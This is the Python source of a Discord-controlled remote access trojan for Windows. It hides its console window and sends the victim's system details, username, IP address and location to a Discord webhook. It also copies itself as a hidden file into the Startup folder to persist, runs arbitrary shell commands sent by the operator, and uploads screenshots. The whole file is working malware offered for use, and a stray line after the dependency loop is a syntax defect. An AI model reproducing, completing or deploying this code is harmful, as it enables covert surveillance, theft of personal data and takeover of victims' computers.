import sys
import subprocess
import importlib

# Dependency bootstrap
required = ['requests', 'discord', 'pyautogui', 'pywin32', 'pillow']
for pkg in required:
    try:
        importlib.import_module(pkg)
    except ImportError:
        subprocess.check_call([sys.executable, "-m", "pip", "install", pkg])
f
# Now you can import safely
import platform
import getpass
import os
import requests
import discord
import time
import pyautogui
import subprocess
import ctypes, win32process
from dataclasses import dataclass, field
from discord.ext import commands

#*bitch*

bot = commands.Bot(command_prefix=',', intents=discord.Intents.all())

# im gonna overload on comments here just to help my self

def HideMyAss():
   ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
HideMyAss()

@dataclass  # just a data decorator adding methods (i.e : __post_init__)
class BotConfig:  # also, since i added dataclass this is already the __init__ method ending at line 16
    username: str = field(default_factory=os.getlogin)  # when a new BotConfig is created without a username, call .getlogin to get username
    startup_path: str = field(init=False)  # cant be assigned in __init__, must be assigned in __post_init__ later manually
    webhook: str = 'webhook' 
    token: str = 'ur token'

    def __post_init__(self):  # defining special method that runs immediately after the auto gened __init__ method
        self.startup_path = (  # setting the startup path
            f"C:\\Users\\{self.username}"
            "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
        )


@dataclass
class WebhookWrapper:
    webhook = BotConfig().webhook

    def get_location(self, retries: int = 3, timeout: int = 5) -> dict:
        for _ in range(retries):
            try:
                res = requests.get('http://ip-api.com/json/', timeout=timeout)
                return res.json() 
            except requests.RequestException:
                continue
        return {
            'query': 'Error',
            'as': 'Error',
            'country': 'Error',
            'city': 'Error'
        }

    def send_to_webhook(self):
        ip_data = self.get_location()
        uname = platform.uname()

        data = {
            'content': f"""**New Client Info \n # 1 victory royale @everyone**
            OS: {uname.system} {uname.version}
            Architecture: {uname.processor}
            Username: {getpass.getuser()}
            Hostname: {uname.node}
            IP: {ip_data['query']}
            ISP: {ip_data['as']}
        Location: {ip_data['city']}, {ip_data['country']}"""
        }

        try:
            r = requests.post(self.webhook, json=data)
            r.raise_for_status()
        except Exception as e:
            print(f"Failed to send to webhook: {e}")


class startupcmd:
    def __init__(self, conf: BotConfig):
        self.conf = conf
        self.contents = None
        self.startup_file = os.path.join(conf.startup_path, "bigdickboi.py")

    async def opening_and_reading_file(self, ctx):
        try:
            with open(__file__, 'r', encoding='utf-8') as f:
                self.contents = f.read()  # read file into self.contents
        except Exception as e:  # opening file so we can add contents
            await ctx.reply(f'error {e}')  # error handling
        else:
            await ctx.reply("file has been open and read")

    async def initalizing_startup(self, ctx):  # adding file to startup
        try:
            os.makedirs(self.conf.startup_path, exist_ok=True)  # safe folder creation
        except Exception as e:
            await ctx.reply(f'could not create startup folder {e}')
            return

        try:
            if self.contents is None:
                await ctx.reply('no file contents loaded')
                return
            with open(self.startup_file, 'w', encoding='utf-8') as f:
                f.write(self.contents)

            os.system(f'attrib +h "{self.startup_file}"')  # hide the file using +h attribute

            await ctx.reply(f"{self.startup_file} has been added")
        except Exception as e:
            await ctx.reply(f'failed to add to startup. error : {e}')


@bot.command()
async def startup(ctx):
    tool = startupcmd(BotConfig())  
    await tool.opening_and_reading_file(ctx)
    await tool.initalizing_startup(ctx)


@bot.command()
async def shell(ctx):
    cmd = ctx.message.content[7:]  # get command after ",shell " i.e ,shell echo hello!

    try:
        # Runs the command with shell access
        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, text=True, timeout=10)
    except subprocess.CalledProcessError as e:
        output = e.output
    except Exception as e:
        output = f"Error: {e}"

    # Trim output if too long for Discord
    if len(output) > 1900:
        output = output[:1900] + "\n[Output trimmed...]"

    await ctx.reply(f"```\n{output}\n```")



@bot.command()
async def s(ctx):
    try:
        screenshot_path = "ss.png"

        ss = pyautogui.screenshot()  # take screenshot
        ss.save(screenshot_path)

        await ctx.send(file=discord.File(screenshot_path))  # send screenshot file

        os.remove(screenshot_path)  # clean up
    except Exception as e:
        await ctx.reply(f"Screenshot failed: {e}")

if __name__ == "__main__":
    web = WebhookWrapper()
    ip_info = web.send_to_webhook()

    bot.run(BotConfig().token)
